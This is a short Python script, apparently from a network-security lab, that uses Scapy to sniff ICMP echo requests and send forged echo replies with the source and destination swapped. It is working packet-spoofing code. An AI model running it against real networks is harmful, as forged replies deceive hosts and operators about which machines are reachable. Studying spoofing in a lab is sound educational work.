#!/usr/bin/env python
from scapy.all import *

def spoof_icmp(pkt):
  if pkt[ICMP].type == 8:
    print('Sniff ICMP packet from %s to %s, ICMP type %d.' % (pkt[IP].src, pkt[IP].dst, pkt[ICMP].type))
    #ether_packet = Ether()
    #ether_packet.dst = pkt[Ether].src
    #ether_packet.src = pkt[Ether].dst

    ip_packet = IP()
    ip_packet.src = pkt[IP].dst
    ip_packet.dst = pkt[IP].src

    icmp_packet = ICMP()
    icmp_packet.type = 0
    icmp_packet.code = 0
    icmp_packet.id = pkt[ICMP].id
    icmp_packet.seq = pkt[ICMP].seq

    raw_packet = Raw()
    raw_packet.load = pkt[Raw].load

    conf.L3socket=L3RawSocket
    send(ip_packet/icmp_packet/raw_packet) 

if __name__ == '__main__':
  sniff(filter='icmp', prn=spoof_icmp)
